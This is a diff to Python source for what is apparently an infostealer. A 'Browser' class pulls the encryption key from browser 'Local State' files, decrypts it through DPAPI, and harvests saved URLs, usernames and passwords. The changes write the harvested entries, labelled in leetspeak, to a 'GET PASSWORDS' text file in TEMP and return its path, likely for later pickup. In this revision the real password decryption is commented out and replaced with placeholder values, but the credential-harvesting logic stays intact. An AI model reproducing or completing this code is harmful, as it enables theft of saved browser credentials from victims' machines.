@@ -13,8 +13,8 @@ class Browser:
         self.local = os.getenv('LOCALAPPDATA')
         self.temp = os.getenv("TEMP")
         self.Passw = []
+        self.path = ''
         self.main()
-    
     
     def main(self):
         browserPaths = [
@@ -31,7 +31,9 @@ class Browser:
         for paths in browserPaths:
             self.getPassw(paths[0], paths[3])   
             
-        return self.Passw
+        return {
+            'path': self.path
+        }
        
     def getPassw(self, path, arg):
         if not os.path.exists(path): return
@@ -50,9 +52,21 @@ class Browser:
         pathKey = path + "/Local State"
         with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
         master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-        master_key = HelpersSilentScript.CryptUnprotectData(master_key[5:])
+        helper = HelpersSilentScript()
+        master_key = helper.CryptUnprotectData(master_key[5:])
 
         for row in data:
             if row[0] != '':
-                self.Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD:")
                 # self.Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {HelpersSilentScript.DecryptValue(row[2], master_key)}")
+                self.Passw.append(f"UR1: www.google.com | U53RN4M3: email@email.com | P455W0RD: passwd")
+    
+        self.wr1tef0rf1l3(self.Passw, 'THE_NGBD')
+        
+    def wr1tef0rf1l3(self, data, name):
+        path = os.path.join(self.temp, f"{name}.txt")
+        self.path = path
+        with open(path, mode='w', encoding='utf-8') as f:
+            f.write('GET PASSWORDS\n\n')
+            for line in data:
+                if line[0]!= '':
+                    f.write(f'{line}\n')                  
